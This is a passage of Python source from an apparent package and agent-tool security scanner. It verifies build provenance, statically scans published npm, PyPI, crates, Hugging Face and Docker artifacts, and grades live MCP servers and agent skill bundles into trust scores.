    snaps = result.coverage.get("db_snapshots")
    if not isinstance(snaps, dict):
        snaps = {}
    if art.registry_snapshot:
        snaps["registry"] = art.registry_snapshot
    result.coverage["db_snapshots"] = snaps


async def _accurate_artifact_coord(
    owner: str, repo: str, tree: list[dict], token: str | None, ref: str | None,
) -> tuple[str, str, str | None] | None:
    """Resolve the published ``(ecosystem, name, version)`` from the repo's OWN root
    manifest — the accurate registry name, NEVER the bare repo-folder guess.

    This is the package-identity guard for the artifact scan. Using the folder name
    (the old behavior) meant ``owner/servers`` was diffed against an unrelated npm
    ``servers`` package — producing bogus artifact_drift + that stranger's whole
    dependency graph attributed to the repo (even a Go repo picking up npm CVEs).
    We only return a coordinate when the repo's manifest actually NAMES a published
    package, and never for a ``"private": true`` package. Returns None otherwise, so
    the artifact scan is skipped rather than run against a stranger.
    """
    root_names = {Path(it["path"]).name.lower(): it["path"]
                  for it in tree if "/" not in it["path"]}

    async def _read(path: str) -> str | None:
        try:
            return await _fetch_file_content(owner, repo, path, token, ref)
        except Exception:  # noqa: BLE001 — fail-open
            return None

    if "package.json" in root_names:
        txt = await _read(root_names["package.json"])
        if not txt:
            return None
        try:
            data = json.loads(txt) or {}
        except (ValueError, TypeError):
            return None
        if data.get("private") is True:  # workspace root / never published
            return None
        name = data.get("name")
        return ("npm", name, None) if isinstance(name, str) and name else None

    for mf in ("pyproject.toml", "setup.py", "setup.cfg"):
        if mf in root_names:
            txt = await _read(root_names[mf])
            if not txt:
                return None
            m = re.search(
                r'(?mi)^\s*name\s*=\s*["\']([A-Za-z0-9][A-Za-z0-9._-]*)["\']', txt,
            )
            return ("pypi", m.group(1), None) if m else None

    if "cargo.toml" in root_names:
        txt = await _read(root_names["cargo.toml"])
        if not txt:
            return None
        m = re.search(
            r'(?is)\[package\].*?^\s*name\s*=\s*["\']([A-Za-z0-9][A-Za-z0-9._-]*)["\']',
            txt, re.MULTILINE,
        )
        return ("crates", m.group(1), None) if m else None

    return None


async def _resolve_repo_package(
    owner: str, repo: str, tree: list[dict], token: str | None, ref: str | None,
) -> dict:
    """Resolve the published package a repo maps to: the name its root manifest
    declares, kept only when that package's registry entry points back at this repo.
    Returns ``{}`` when the repo publishes no package we can tie to it.

    Never guesses: a missing/unparseable manifest, a ``"private": true`` workspace
    root, or a registry entry that names another repo (or none) all return ``{}``.
    Fail-open on errors (returns ``{}``)."""
    coord = await _accurate_artifact_coord(owner, repo, tree, token, ref)
    if not coord:
        return {}
    surface, name, _version = coord
    return await _verified_package_coordinate(owner, repo, surface, name)


async def _maybe_verify_provenance(
    result: ScanResult,
    owner: str,
    repo: str,
    tree: list[dict],
    token: str | None,
    ref: str | None,
    artifact: tuple[str, str, str | None] | None,
) -> None:
    """Phase 3 — fetch + cryptographically verify build provenance (npm/PyPI).

    Feature-flagged (``settings.scanner_verify_provenance``, default OFF) and
    FAIL-OPEN: any resolve/fetch/verify error leaves the grade + coverage
    untouched and ``coverage.provenance_binding`` stays ``"n/a"``.

    Scoring policy (Kenne decision #4), applied as a SEPARATE additive signal:
      * absent provenance  → N/A, **never a penalty** (the long tail has none);
      * present + verified  → a small bonus, and sets
        ``coverage.provenance_binding = "verified:<repo>@<commit>"`` + the
        provenance evidence anchor;
      * CLAIMS provenance but fails verification → a small penalty (real red flag).

    Provenance pairs naturally with the Phase-2 artifact fetch: when the published
    artifact was resolved we verify THAT exact digest (enabling the subject-digest
    gate and the top-tier "certified" eligibility). Without a concrete version we
    skip (fail-open) rather than guess.
    """
    from src.config import settings

    if not getattr(settings, "scanner_verify_provenance", False):
        return

    # Resolve a concrete coordinate. Prefer the Phase-2-resolved artifact (gives a
    # digest + artifact scan_depth); else an explicit caller coordinate.
    ecosystem = name = version = None
    artifact_digest = None
    filename = None
    art = result.artifact_scan if isinstance(result.artifact_scan, dict) else {}
    if art.get("ok"):
        ecosystem, name, version = art.get("ecosystem"), art.get("name"), art.get("version")
        artifact_digest = art.get("digest")
        dl = art.get("download_url")
        if dl:
            filename = Path(str(dl).split("?", 1)[0]).name
    elif artifact and artifact[2] and await _package_points_back(
        owner, repo, artifact[0], artifact[1],
    ):
        ecosystem, name, version = artifact

    surface = {"npm": "npm", "pypi": "pypi"}.get((ecosystem or "").lower())
    if not surface or not name or not version:
        return  # no verifiable coordinate → stay n/a, fail-open

    claimed_repo = f"https://github.com/{owner}/{repo}"
    scan_depth = (result.coverage or {}).get("scan_depth", "repo-only")

    try:
        from src.scanner.provenance import analyze_provenance

        res = await analyze_provenance(
            surface, name, version,
            filename=filename,
            claimed_repo=claimed_repo,
            artifact_digest=artifact_digest,
            scan_depth=scan_depth,
        )
    except Exception:
        logger.warning(
            "Provenance verification wiring failed for %s/%s — repo grade stands",
            owner, repo, exc_info=True,
        )
        return

    _apply_provenance_result(result, res, claimed_repo)


def _apply_provenance_result(result: ScanResult, res, claimed_repo: str | None) -> None:
    """Fold a verified :class:`ProvenanceResult` into ``result.provenance`` + the
    coverage block (score delta, binding, Rekor pin, evidence anchor, linked repo).
    Shared by the repo path (``_maybe_verify_provenance``) and the native package
    scan (``scan_package``) so both wire provenance identically."""
    from src.scanner.provenance import coverage_binding_value, provenance_score_delta

    delta, reason = provenance_score_delta(res)
    summary = res.summary()
    summary["score_delta"] = delta
    summary["score_reason"] = reason
    result.provenance = summary

    # Wire into the coverage block (recompute discipline).
    if not isinstance(result.coverage, dict):
        result.coverage = {}
    result.coverage["provenance_binding"] = coverage_binding_value(res)
    if res.snapshot:
        snaps = result.coverage.get("db_snapshots")
        if not isinstance(snaps, dict):
            snaps = {}
        # Pin the Rekor index / fetch timestamp so the check is offline-recomputable.
        if res.snapshot.get("rekor_log_index"):
            snaps["rekor_log_index"] = res.snapshot["rekor_log_index"]
        result.coverage["db_snapshots"] = snaps

    if res.verified:
        # Add the provenance evidence anchor and record the verified source binding.
        from src.scanner.coverage import EVIDENCE_ANCHOR_SBOM, build_evidence_anchors

        has_sbom = EVIDENCE_ANCHOR_SBOM in (result.coverage.get("evidence_anchors") or [])
        result.coverage["evidence_anchors"] = build_evidence_anchors(
            has_sbom=has_sbom, has_provenance=True,
        )
        linked = result.coverage.get("linked_repo")
        if not isinstance(linked, dict):
            linked = {"url": claimed_repo} if claimed_repo else {}
        prov_commit = res.binding.get("commit")
        if prov_commit:
            linked["commit"] = prov_commit
        linked["binding"] = "slsa-provenance"
        result.coverage["linked_repo"] = linked


def _bind_pypi_declared_repo(res, manifest: dict | None) -> None:
    """PEP 740: compare the verified Trusted Publisher repo (from the signed cert SAN)
    with the repo the project declares on PyPI. A match sets ``source_matches_claim``
    (what Certified needs). A mismatch or no declaration leaves it unset: never a
    penalty, just not certifiable."""
    from src.scanner.provenance import normalize_repo

    declared = normalize_repo((manifest or {}).get("declared_repository"))
    bound = (getattr(res, "binding", None) or {}).get("repo")
    if not (getattr(res, "verified", False) and declared and bound):
        return
    if res.source_matches_claim is None and bound == declared:
        res.claimed_repo = declared
        res.source_matches_claim = True


def _repo_from_manifest(manifest: dict | None) -> str | None:
    """Extract the declared source repository from an npm package.json ``repository``
    field (a string or a ``{"url": ...}`` object) — the claim provenance is checked
    against for ``source_matches_claim``."""
    if not isinstance(manifest, dict):
        return None
    repo = manifest.get("repository")
    if isinstance(repo, str):
        return repo
    if isinstance(repo, dict):
        url = repo.get("url")
        return url if isinstance(url, str) else None
    return None


def _looks_like_mcp_server(eco: str, name: str, manifest: dict | None) -> bool:
    """Heuristic: is this published package a runnable MCP server? Checks the npm
    manifest (MCP SDK dep, `mcp`/`modelcontextprotocol` keyword, a `bin` entry) and
    the package name. Used only to pick the install affordance — never the grade."""
    n = (name or "").lower()
    if "mcp" in n or "model-context-protocol" in n or "modelcontextprotocol" in n:
        return True
    if isinstance(manifest, dict):
        deps = {}
        for k in ("dependencies", "peerDependencies", "devDependencies"):
            d = manifest.get(k)
            if isinstance(d, dict):
                deps.update(d)
        if any("modelcontextprotocol" in str(dk).lower() or dk.lower() == "fastmcp" for dk in deps):
            return True
        kws = manifest.get("keywords")
        if isinstance(kws, list) and any(
            "mcp" == str(kw).lower() or "modelcontextprotocol" in str(kw).lower() for kw in kws
        ):
            return True
        if manifest.get("bin"):
            desc = str(manifest.get("description", "")).lower()
            if "mcp" in desc or "model context protocol" in desc:
                return True
    return False


def _declared_scope_from_artifact(files: dict) -> dict:
    """``.agentavow.yml`` from an unpacked artifact's files (``{path: ArtifactFile}``),
    parsed into the same ``declared_scope`` shape the repo scan produces. The file must
    sit at the artifact root (one wrapper directory is tolerated). ``{}`` if absent,
    binary, or malformed — a bad manifest is simply no declaration."""
    try:
        from src.scanner.behavioral.manifest import parse_manifest
        for path, f in (files or {}).items():
            parts = [p for p in str(path).replace("\\", "/").split("/") if p]
            if not parts or parts[-1].lower() not in (".agentavow.yml", ".agentavow.yaml"):
                continue
            if len(parts) > 2:
                continue  # nested copies are not the tool's own declaration
            text = getattr(f, "text", None)
            if not isinstance(text, str):
                continue
            scope = parse_manifest(text)
            if scope.present:
                return {"present": True, "egress": scope.egress,
                        "capabilities": scope.capabilities, "note": scope.note}
    except Exception:  # noqa: BLE001 — a manifest must never break a scan
        pass
    return {}


def _env_reads_from_artifact(files: dict) -> list[str]:
    """Env var names the artifact's sources read (behavioral canary targets). Fail-open."""
    try:
        from src.scanner.behavioral.env_reads import env_names_from_files
        return env_names_from_files(files)
    except Exception:  # noqa: BLE001 — never break a scan
        return []


def _deprecation_finding(eco: str, name: str, version: str, message: str) -> Finding:
    """'Clean but abandoned': the maintainer retired the package. Not malicious, so it is
    a MEDIUM maintenance finding (no security fixes are coming), never a blocker."""
    where = "package.json" if eco == "npm" else "registry metadata"
    return Finding(
        category="maintenance",
        name="Package deprecated by its maintainer",
        severity="medium",
        file_path=where,
        line_number=0,
        snippet=f"{name}@{version}: {message}"[:300],
        remediation=(
            "The maintainer has retired this package, so it will not receive security "
            "fixes. Don't adopt it for new work; move to a maintained alternative (the "
            "deprecation message often names one) and scan that before you connect it."
        ),
    )


async def scan_package(surface: str, name: str, version: str | None = None) -> ScanResult:
    """Grade a PUBLISHED npm / PyPI package directly by coordinate — no GitHub repo
    required. Fetches + STATICALLY scans the real artifact tree (the same 12-category
    engine + install-hook detectors, via ``scan_artifact_files``), verifies the
    package's build provenance on the exact coordinate (the axis that can earn A+),
    and returns a signed A+..F ``ScanResult`` with ``coverage.surface`` set and
    ``scan_depth = "artifact"``.

    Fail-open: any fetch/scan/verify error yields a ``ScanResult`` carrying
    ``.error`` (or a benign partial result) — it never raises.
    """
    from src.config import settings
    from src.scanner.artifact_fetch import (
        ArtifactFetchError,
        fetch_crates_artifact,
        fetch_docker_artifact,
        fetch_huggingface_artifact,
        fetch_npm_artifact,
        fetch_pypi_artifact,
    )
    from src.scanner.coverage import SCAN_DEPTH_ARTIFACT

    eco = (surface or "").strip().lower()
    if eco == "python":
        eco = "pypi"
    elif eco in ("crate", "cargo", "rust"):
        eco = "crates"
    elif eco in ("hf", "hugging_face", "hugging-face"):
        eco = "huggingface"
    elif eco in ("container", "oci", "image", "dockerhub"):
        eco = "docker"
    result = ScanResult(repo=f"{eco}:{name}", stars=0, description="", framework="")
    if eco not in ("npm", "pypi", "crates", "huggingface", "docker"):
        result.error = (
            f"unsupported surface: {surface!r} "
            "(use npm, pypi, crates, huggingface, or docker)"
        )
        return result
    if not getattr(settings, "scanner_scan_artifact", False):
        result.error = "artifact scanning is disabled"
        return result

    try:
        if eco == "npm":
            fetched = await fetch_npm_artifact(name, version)
        elif eco == "crates":
            fetched = await fetch_crates_artifact(name, version)
        elif eco == "huggingface":
            fetched = await fetch_huggingface_artifact(name, version)
        elif eco == "docker":
            fetched = await fetch_docker_artifact(name, version)
        else:
            fetched = await fetch_pypi_artifact(name, version)
    except ArtifactFetchError as exc:
        result.error = str(exc)
        return result
    except Exception as exc:  # noqa: BLE001 — fail-open is mandatory
        result.error = f"artifact fetch failed: {exc}"
        logger.warning("scan_package fetch failed for %s:%s", eco, name, exc_info=True)
        return result
    if not fetched.ok:
        result.error = fetched.error or "artifact fetch failed"
        return result

    # Unpacked-tree scanning is CPU-bound (a big wheel is seconds of regex work): run it
    # off the event loop so other requests keep being served. No DB/session work here.
    await asyncio.to_thread(apply_artifact_scan, result, eco, fetched)

    # Provenance verification on the exact coordinate — this is what makes A+
    # reachable for a package that publishes Sigstore/PEP-740 provenance. (Images:
    # cosign signatures, checked in ``apply_docker_image_extras`` below.)
    if getattr(settings, "scanner_verify_provenance", False) and eco != "docker":
        try:
            from src.scanner.provenance import analyze_provenance

            claimed_repo = _repo_from_manifest(fetched.packaged_manifest)
            filename = (
                Path(str(fetched.download_url).split("?", 1)[0]).name
                if (eco == "pypi" and fetched.download_url) else None
            )
            res = await analyze_provenance(
                eco, fetched.name, fetched.version,
                filename=filename,
                claimed_repo=claimed_repo,
                artifact_digest=fetched.digest,
                scan_depth=SCAN_DEPTH_ARTIFACT,
            )
            if eco == "pypi":
                _bind_pypi_declared_repo(res, fetched.packaged_manifest)
            _apply_provenance_result(result, res, claimed_repo)
        except Exception:
            logger.warning(
                "scan_package provenance wiring failed for %s:%s", eco, name, exc_info=True
            )

    # OSV for the package itself: MAL- incident history (context only, never scored) and
    # its own published advisories — one that affects the scanned version IS a finding.
    # Fetched BEFORE scoring so those findings count. Fail-open.
    _osv_checked = False
    try:
        from src.scanner.incident_history import fetch_incident_history
        _ver = (result.artifact_scan or {}).get("version") or version
        result.incident_history = await fetch_incident_history(surface, name, _ver)
        _osv_checked = (result.incident_history or {}).get("checked") is True
        result.findings = result.findings + _own_advisory_findings(
            name, _ver, (result.incident_history or {}).get("advisories") or [])
    except Exception:
        pass
    # An ecosystem OSV covers whose lookup did not complete: "no advisories" was not
    # checked, so say so beside the answer (disclosure only, never scored).
    try:
        from src.scanner.incident_history import _OSV_ECOSYSTEM
        if (surface or "").lower() in _OSV_ECOSYSTEM and not _osv_checked:
            result.coverage_gaps = {**(result.coverage_gaps or {}),
                                    "advisory_lookup": "failed"}
    except Exception:  # noqa: BLE001 — disclosure must never break a scan
        pass

    if eco == "docker":
        # The image's installed packages → OSV (fixable CVEs, dependency-class), its
        # cosign signature/attestation → provenance, and what the layer walk read.
        from src.scanner.docker_image import apply_docker_image_extras
        await apply_docker_image_extras(result, fetched)

    result.trust_score = _calculate_trust_score(result)
    result.category_scores = _calculate_category_scores(result)
    result.certified = _certified_status(result)
    return result


def apply_artifact_scan(result: ScanResult, eco: str, fetched) -> None:
    """The offline part of :func:`scan_package`: run the static engine over an unpacked
    artifact and fill ``result`` (findings, coverage, artifact metadata). Pure — no
    network — so the static corpus gate (``scripts/corpus/run_static_corpus.py``) runs
    exactly the code production runs. Provenance, OSV advisories and scoring follow in
    the caller."""
    from src.scanner.artifact_scan import (
        _registry_snapshot,
        docker_config_findings,
        huggingface_weight_findings,
        scan_artifact_files,
    )
    from src.scanner.coverage import SCAN_DEPTH_ARTIFACT, build_coverage

    oversized: list[str] = []
    findings, files_scanned, has_hook = scan_artifact_files(fetched, oversized_out=oversized)
    # npm / PyPI: text that matches an attack pattern in detection data, a prebuilt web
    # bundle or a non-tool prompt template is not the package running it (no-op for
    # other ecosystems).
    from src.scanner.package_context import calibrate_package_findings
    findings = calibrate_package_findings(findings, fetched)
    if eco == "huggingface":
        findings = findings + huggingface_weight_findings(fetched)
    elif eco == "docker":
        # The OCI config's own signal (root/env/base) on top of the layer walk's files.
        findings = findings + docker_config_findings(fetched)
    if getattr(fetched, "deprecation", None):
        result.deprecation = fetched.deprecation
        findings = findings + [_deprecation_finding(eco, fetched.name, fetched.version,
                                                    fetched.deprecation)]
    result.findings = findings
    result.files_scanned = files_scanned
    result.total_scannable_files = files_scanned
    # A big artifact is read bounded: binaries / media / test data past the budget are
    # skipped so the code still gets scanned. When any skipped member is one the engine
    # would have read, the grade covers only part of the package: say so through the
    # same disclosure a capped repo scan uses (sampled + the larger total; it is signed
    # into the attestation and keeps the Certified full-coverage check from passing).
    skipped = getattr(fetched, "skipped", None)
    if skipped is not None and getattr(skipped, "scannable", 0) > 0:
        result.sampled = True
        result.total_scannable_files = files_scanned + skipped.scannable
    # Coverage gaps (disclosure only; `sampled` above is unchanged): source files over
    # the 500 KB read cap, kept or dropped at unpack, and members the bounded unpack
    # skipped. Stated beside the answer so a partial read never reads as clean.
    gaps: dict = {}
    n_over = len(oversized) + int(getattr(skipped, "oversized_scannable", 0) or 0)
    if n_over:
        gaps["oversized_files"] = n_over
    if skipped is not None and int(getattr(skipped, "scannable", 0) or 0) > 0:
        gaps["package_skipped"] = int(skipped.scannable)
    result.coverage_gaps = gaps
    # Declared-scope manifest shipped INSIDE the artifact (same file the repo scan reads
    # at the repo root). Fail-open: absent/malformed = no declaration. The behavioral
    # tier judges observed egress against these declared hosts.
    result.declared_scope = _declared_scope_from_artifact(fetched.files)
    result.env_reads = _env_reads_from_artifact(fetched.files)
    result.primary_language = (
        "JavaScript/TypeScript" if eco == "npm"
        else "Rust" if eco == "crates"
        else "ML Model" if eco == "huggingface"
        else "Container image" if eco == "docker"
        else "Python"
    )
    if fetched.description:
        result.description = fetched.description.strip()[:180]
    result.has_readme = any(
        Path(p).name.lower().startswith("readme") for p in fetched.files
    )
    result.has_license = any(
        Path(p).name.lower().startswith(("license", "licence", "copying"))
        for p in fetched.files
    )
    _hf = (fetched.packaged_manifest or {}).get("hf") if eco == "huggingface" else None
    if isinstance(_hf, dict) and _hf.get("license"):
        result.has_license = True  # HF declares it in the model card, not a LICENSE file
    result.artifact_scan = {
        "ok": True, "ecosystem": fetched.ecosystem, "name": fetched.name,
        "version": fetched.version, "kind": fetched.kind, "digest": fetched.digest,
        "download_url": fetched.download_url, "file_count": fetched.file_count,
        "unpacked_size": fetched.unpacked_size, "has_install_hook": has_hook,
        # Is this package a runnable MCP server? (→ the UI offers stdio 1-click
        # deeplinks with `npx -y <pkg>` / `uvx <pkg>`, not just an install command.)
        "is_mcp_server": _looks_like_mcp_server(eco, fetched.name, fetched.packaged_manifest),
        "published_at": getattr(fetched, "published_at", None),
    }
    if skipped is not None and getattr(skipped, "count", 0) > 0:
        result.artifact_scan["skipped"] = skipped.summary()
    if isinstance(_hf, dict):
        from src.scanner.hf_facts import model_card_facts
        result.artifact_scan["model_card"] = model_card_facts(_hf)
    _repo_url = (fetched.packaged_manifest or {}).get("repository") \
        if eco == "crates" else None
    if isinstance(_repo_url, str) and _repo_url:
        result.artifact_scan["repository"] = _repo_url[:300]
    if eco == "crates" and (fetched.packaged_manifest or {}).get("license"):
        result.has_license = True  # crates.io records the SPDX license per version
    if result.artifact_scan["is_mcp_server"]:
        from src.scanner.mcp_tool_list import static_tool_list
        result.tool_list = static_tool_list(fetched.files)
    result.coverage = build_coverage(
        surface=eco,
        artifact_digest=fetched.digest,
        scan_depth=SCAN_DEPTH_ARTIFACT,
        db_snapshots={"registry": _registry_snapshot()},
    )


def _own_advisory_findings(name: str, version: str | None, advisories: list[dict]) -> list:
    """A published advisory (GHSA / PYSEC / CVE) against the package ITSELF that affects
    the scanned version: a known, current vulnerability in exactly what you'd install."""
    out = []
    for a in advisories:
        if not a.get("affects_scanned_version"):
            continue
        fixed = a.get("fixed_in")
        ids = ", ".join([a.get("id") or ""] + list(a.get("aliases") or [])[:2]).strip(", ")
        out.append(Finding(
            category="known_vulnerability",
            name=("Published advisory affects this version: "
                  f"{a.get('summary') or a.get('id')}")[:160],
            severity=a.get("severity") or "medium",
            file_path="registry advisory",
            line_number=0,
            snippet=f"{name}@{version}: {ids}"[:300],
            remediation=(f"Upgrade to {fixed} or later, which fixes this advisory." if fixed
                         else "No fixed release is listed; avoid this package or isolate it."),
        ))
    return out


async def scan_mcp(endpoint_url: str) -> ScanResult:
    """Grade a LIVE MCP server by its endpoint URL (roadmap §2.D). Handshakes the
    server, enumerates its advertised ``tools/list`` (+ resources/prompts), and
    scores the SERVED surface — tool-poisoning in descriptions, input-schema risk,
    dangerous-capability taxonomy + lethal trifecta, annotation truthfulness.

    ``coverage.surface = "mcp"``, ``scan_depth = "artifact+live"`` (live-observed,
    point-in-time — the served surface can change, so this is not offline-recompute
    anchored). Fail-open: a handshake failure returns a ScanResult with ``.error``.
    """
    from src.scanner.coverage import SCAN_DEPTH_ARTIFACT_LIVE, build_coverage
    from src.scanner.mcp_scan import analyze_mcp, compute_tool_digests, fetch_mcp_tools

    result = ScanResult(repo=f"mcp:{endpoint_url}", stars=0, description="", framework="")
    result.is_mcp_server = True
    data = await fetch_mcp_tools(endpoint_url)
    if not data:
        result.error = (
            "Could not handshake the MCP server — check it's a reachable "
            "Streamable-HTTP endpoint (stdio/SSE-only servers aren't supported yet)."
        )
        return result

    mcp = analyze_mcp(
        data.get("tools"),
        resources=data.get("resources"),
        prompts=data.get("prompts"),
        server_info=data.get("server_info"),
    )
    result.findings = mcp.findings
    # A server that serves agents different tools than it served the scanner: grade the
    # agent's view too (its poisoning is what reaches an agent) and report the switch.
    from src.scanner.mcp_scan import client_view_findings
    _view = data.get("client_view")
    if _view and _view.get("differs"):
        result.findings.extend(client_view_findings(_view, data.get("tools")))
        _seen = {(f.name, f.file_path) for f in result.findings}
        for f in analyze_mcp(_view.get("tools"), server_info=data.get("server_info")).findings:
            if (f.name, f.file_path) not in _seen:
                result.findings.append(f)
    # Pin the served tool definitions, one digest per tool name. A later scan whose
    # digest differs proves the server changed what it serves (the rug-pull), and a
    # gate can bind an authorization to the named tool that was graded.
    result.tool_digests = compute_tool_digests(data.get("tools"))
    result.tool_manifest_digest = _compute_manifest_digest(result.tool_digests)
    from src.scanner.mcp_tool_list import build_tool_list
    result.tool_list = build_tool_list(data.get("tools"))
    result.files_scanned = mcp.tool_count
    result.total_scannable_files = mcp.tool_count
    result.primary_language = "MCP"
    _server = (mcp.server_name or "").strip()
    _n = mcp.tool_count or 0
    result.description = (
        f"{_server} — MCP server · {_n} tool{'' if _n == 1 else 's'}"
        if _server else f"MCP server · {_n} tool{'' if _n == 1 else 's'}"
    )
    if mcp.tool_count and not mcp.lethal_trifecta and result.critical_count == 0:
        result.positive_signals.append(f"{mcp.tool_count} tools enumerated · no lethal trifecta")
    result.artifact_scan = {
        "surface": "mcp", "server_name": mcp.server_name,
        "tool_count": mcp.tool_count, "resource_count": mcp.resource_count,
        "prompt_count": mcp.prompt_count, "capabilities": mcp.capabilities,
        "lethal_trifecta": mcp.lethal_trifecta,
        "blast_radius": mcp.blast_radius,
    }
    result.coverage = build_coverage(
        surface="mcp", scan_depth=SCAN_DEPTH_ARTIFACT_LIVE, live_observed=True,
    )
    # Coverage gaps (disclosure only): a tools/list that failed, or a paged tool list
    # read only to its first page, is not the whole tool set.
    _gaps: dict = {}
    if data.get("tools_list_failed"):
        _gaps["tool_list_unread"] = True
    if data.get("tools_more_pages"):
        _gaps["tool_list_paged"] = True
    result.coverage_gaps = _gaps
    result.trust_score = _calculate_trust_score(result)
    result.category_scores = _calculate_category_scores(result)
    result.certified = _certified_status(result)
    return result


def _extract_skill_refs(text: str, skill_dir: str, blobs: list[str]) -> list[str]:
    """Blob paths a SKILL.md references — markdown links + inline file paths — resolved
    against the skill dir then the repo root. Powers reference-graph closure so an
    injection in a deep progressive-disclosure file the SKILL.md points to still gets
    scanned. Skips URLs; only returns paths that actually exist in the tree."""
    import posixpath
    import re as _re

    blobset = set(blobs)
    exts = "md|markdown|sh|bash|zsh|py|js|ts|rb|pl|ps1|json|txt|yaml|yml"
    refs: list[str] = []
    for m in _re.finditer(rf"""[(\s"'`]((?:\./|\.\./|/)?[\w./-]+\.(?:{exts}))""", text):
        raw = m.group(1)
        if raw.startswith(("http", "//")) or "://" in raw:
            continue
        raw = raw.lstrip("/")
        candidates = []
        if skill_dir:
            candidates.append(posixpath.normpath(f"{skill_dir}/{raw}"))
        candidates.append(posixpath.normpath(raw))
        for c in candidates:
            if c in blobset and c not in refs:
                refs.append(c)
                break
    return refs


async def scan_skill(owner: str, repo: str, skill: str | None = None) -> ScanResult:
    """Grade an OpenClaw / Agent SKILL living in a GitHub repo (roadmap §2.D). Finds
    the SKILL.md, fetches the manifest + bundled scripts + lifecycle-hook files, and
    STATICALLY grades the capability surface — the auto-exec `allowed-tools` grant,
    always-loaded-description injection, lifecycle-hook escalation, and env-exfil in
    scripts. ``coverage.surface = openclaw``, scan_depth = artifact. Fail-open.

    A repo can hold MANY skills (e.g. anthropics/skills). ``skill`` names one of them
    by its directory (``skills/pdf``) or folder name (``pdf``) and grades only that
    skill. Without it, a single-skill repo is graded as before; a multi-skill repo
    grades EVERY skill (capped, see ``src.scanner.skill_collection``) and the repo's
    result is the WORST skill's, with every skill's answer listed alongside."""
    from src.github_auth import get_github_token
    from src.scanner.skill_collection import (
        build_collection_result,
        grade_skills,
        real_skill_mds,
        resolve_skill_md,
    )

    result = ScanResult(repo=f"skill:{owner}/{repo}", stars=0, description="", framework="")
    try:
        token = await get_github_token()
        tree, _trunc, repo_ok, ref = await _fetch_repo_tree(owner, repo, token)
        if not repo_ok:
            result.error = "Repository not found or unreadable"
            return result
        blobs = [it["path"] for it in tree if it.get("type") == "blob"]
        skill_mds = [p for p in blobs if p.lower().endswith("skill.md")]
        if not skill_mds:
            result.error = "No SKILL.md found — this repo isn't a recognizable Agent Skill."
            return result

        if skill:
            md = resolve_skill_md(skill_mds, skill)
            if md is None:
                result.error = f"Skill not found in this repo: {skill}"
                return result
            one = await _grade_skill_at(owner, repo, token, ref, blobs, md)
            sub = md.rsplit("/", 1)[0] if "/" in md else ""
            if not one.error and sub:
                one.repo = f"skill:{owner}/{repo}/{sub}"
            return one

        real = real_skill_mds(skill_mds)
        if len(real) <= 1:
            # One skill (or only template skeletons): grade the primary, as before.
            primary = min(real or skill_mds, key=lambda p: (p.count("/"), p.lower()))
            return await _grade_skill_at(owner, repo, token, ref, blobs, primary)

        graded, total = await grade_skills(
            real, lambda md: _grade_skill_at(owner, repo, token, ref, blobs, md))
        if not graded:
            result.error = "Could not grade any of this repo's skills."
            return result
        return build_collection_result(f"skill:{owner}/{repo}", graded, total)
    except Exception as exc:  # noqa: BLE001 — fail-open
        result.error = f"skill scan failed: {exc}"
        logger.warning("scan_skill failed for %s/%s", owner, repo, exc_info=True)
    return result


async def _grade_skill_at(
    owner: str, repo: str, token: str | None, ref: str | None, blobs: list[str],
    skill_md_path: str,
) -> ScanResult:
    """Grade ONE skill: the SKILL.md at ``skill_md_path`` plus the scripts, hooks and
    referenced files in its own directory. Fail-open (``.error`` on failure)."""
    from src.scanner.coverage import SCAN_DEPTH_ARTIFACT, build_coverage
    from src.scanner.skill_scan import analyze_skill

    result = ScanResult(repo=f"skill:{owner}/{repo}", stars=0, description="", framework="")
    try:
        skill_dir = skill_md_path.rsplit("/", 1)[0] if "/" in skill_md_path else ""
        script_ext = (".sh", ".bash", ".zsh", ".py", ".js", ".ts", ".rb", ".pl", ".ps1")
        hook_names = ("hooks.json", "plugin.json", ".mcp.json")

        def _in_skill(p: str) -> bool:
            if skill_dir and not (p == skill_md_path or p.startswith(skill_dir + "/")):
                return False
            base = p.rsplit("/", 1)[-1].lower()
            return (p.lower().endswith((".md",) + script_ext)) or base in hook_names

        # Fetch SKILL.md FIRST so we can follow its references (progressive
        # disclosure): a deep referenced file is exactly where injection hides.
        skill_md_text = await _fetch_file_content(owner, repo, skill_md_path, token, ref)
        if skill_md_text is None:
            result.error = "Could not read the skill's SKILL.md."
            return result

        # Reference-graph closure — files SKILL.md points at get PRIORITY over the
        # generic in-dir sweep, so a referenced file (even in a subdir / past the cap)
        # is always scanned.
        referenced = _extract_skill_refs(skill_md_text, skill_dir, blobs)
        in_dir = [p for p in blobs if p != skill_md_path and _in_skill(p)]
        ordered = list(dict.fromkeys(referenced + in_dir))[:39]  # dedup, referenced first

        files: dict[str, str] = {skill_md_path: skill_md_text}
        for p in ordered:
            txt = await _fetch_file_content(owner, repo, p, token, ref)
            if txt is not None:
                files[p] = txt

        skill = analyze_skill(files, skill_md_path=skill_md_path)

        # Env vars the skill's scripts read: the behavioral sandbox fills each
        # secret-named one with a canary when it runs the hooks and scripts.
        from types import SimpleNamespace
        result.env_reads = _env_reads_from_artifact(
            {path: SimpleNamespace(text=text) for path, text in files.items()})

        result.findings = skill.findings
        result.files_scanned = len(files)
        result.total_scannable_files = len(files)
        result.primary_language = "Agent Skill"
        result.tool_manifest_digest = skill.tree_digest
        result.artifact_scan = {
            "surface": "openclaw", "skill_name": skill.skill_name,
            "skill_path": skill_dir,
            "allowed_tools": skill.allowed_tools, "auto_exec_risk": skill.auto_exec_risk,
            "has_lifecycle_hooks": skill.has_lifecycle_hooks, "script_count": skill.script_count,
            "blast_radius": skill.blast_radius,
            "tree_digest": skill.tree_digest,
        }
        if skill.script_count == 0 and not skill.has_lifecycle_hooks and result.critical_count == 0:
            result.positive_signals.append("No bundled scripts or lifecycle hooks")
        result.coverage = build_coverage(surface="openclaw", scan_depth=SCAN_DEPTH_ARTIFACT)
        result.trust_score = _calculate_trust_score(result)
        result.category_scores = _calculate_category_scores(result)
        result.certified = _certified_status(result)
    except Exception as exc:  # noqa: BLE001 — fail-open
        result.error = f"skill scan failed: {exc}"
        logger.warning("skill grade failed for %s/%s %s", owner, repo, skill_md_path,
                       exc_info=True)
    return result


async def _maybe_maintainer_signals(
    result: ScanResult,
    owner: str,
    repo: str,
    token: str | None,
) -> None:
    """Phase 5 — cheap GitHub-METADATA maintainer/behavioral signals (fail-open).

    Feature-flagged (``settings.scanner_maintainer_signals``, default OFF) and
    FAIL-OPEN: any error leaves the grade untouched. NO code execution, NO sandbox
    — only a handful (~5, capped) of read-only GitHub API calls. When on it:
      * appends strong positive labels (active maintenance, protected branch, org
        2FA, signed commits, contributor diversity) to ``positive_signals`` so they
